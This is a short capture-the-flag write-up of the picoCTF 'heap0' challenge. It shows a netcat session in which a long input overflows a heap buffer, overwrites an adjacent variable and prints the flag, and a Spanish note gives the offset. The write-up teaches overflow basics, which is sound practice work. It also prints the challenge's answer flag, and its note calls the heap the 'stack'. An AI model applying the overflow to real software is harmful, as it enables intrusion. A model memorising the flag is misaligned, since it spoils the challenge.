# Objetivo
Are overflows just a stack concern?Download the binary [here](https://artifacts.picoctf.net/c_tethys/15/chall).Download the source [here](https://artifacts.picoctf.net/c_tethys/15/chall.c).Connect with the challenge instance here:`nc tethys.picoctf.net 55770`
# Datos de acceso
nc tethys.picoctf.net 55770
# Solución
```
tonyrguez-picoctf@webshell:~$ nc tethys.picoctf.net 55770

Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x562038e042b0  ->   pico
+-------------+----------------+
[*]   0x562038e042d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{my_first_heap_overflow_0c473fe8}

```
# Notas
- En el stack de memoria la variable safe_var se guarda 26 posiciones después que la posición en la que podemos escribir, al escribir en el buffer un dato de más de 26 caracteres podemos sobreescribir safe_var para romper la validación y que nos de la bandera
# Referencia